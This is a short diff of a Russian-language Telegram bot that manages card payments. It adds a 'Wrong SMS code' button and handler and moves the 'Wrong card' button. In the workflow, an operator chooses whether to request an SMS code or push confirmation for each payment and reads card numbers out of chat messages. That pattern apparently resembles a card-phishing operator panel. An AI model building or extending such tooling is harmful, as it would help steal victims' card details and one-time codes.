@@ -520,19 +520,19 @@ def get_payment_buttons(payment_id, user_id="user123", card_number=None):
     buttons = [
         [
             InlineKeyboardButton(text="📱 SMS код", callback_data=f"sms:{payment_id}:{user_id}"),
-            InlineKeyboardButton(text="🔔 Пуш", callback_data=f"push:{payment_id}:{user_id}")
+            InlineKeyboardButton(text="🔔 Пуш", callback_data=f"push:{payment_id}:{user_id}"),
+            InlineKeyboardButton(text="❌ Неверная карта", callback_data=f"wrong_card:{payment_id}:{user_id}")
+        ],
+        [
+            InlineKeyboardButton(text="❌ Неверный SMS код", callback_data=f"wrong_sms:{payment_id}:{user_id}")
         ]
     ]
     
-    # Добавляем кнопку "Привязать" если карта не привязана
+    # Добавляем кнопку "Привязать" только если карта не привязана
     if card_number and not check_card_in_db(card_number):
         buttons.append([
             InlineKeyboardButton(text="🔗 Привязать", callback_data=f"bind:{payment_id}:{user_id}")
         ])
-    
-    buttons.append([
-        InlineKeyboardButton(text="❌ Неверная карта", callback_data=f"wrong_card:{payment_id}:{user_id}")
-    ])
     
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
@@ -808,6 +808,23 @@ async def wrong_card_handler(callback: types.CallbackQuery):
         card_number
     )
     await callback.answer("Карта отклонена")
+    
+@dp.callback_query(F.data.startswith("wrong_sms:"))
+async def wrong_sms_handler(callback: types.CallbackQuery):
+    parts = callback.data.split(":")
+    payment_id = parts[1]
+    user_id = parts[2]
+    
+    # Извлекаем номер карты из сообщения
+    card_number = extract_card_number(callback.message.text)
+    
+    await update_payment_status(
+        callback, payment_id, user_id,
+        "❌ <b>Статус: Неверный SMS код</b>", 
+        "wrong_sms",
+        card_number
+    )
+    await callback.answer("SMS код отклонен")
 
 @dp.callback_query(F.data.startswith("bind:"))
 async def bind_card_handler(callback: types.CallbackQuery):
@@ -1613,6 +1630,7 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
 
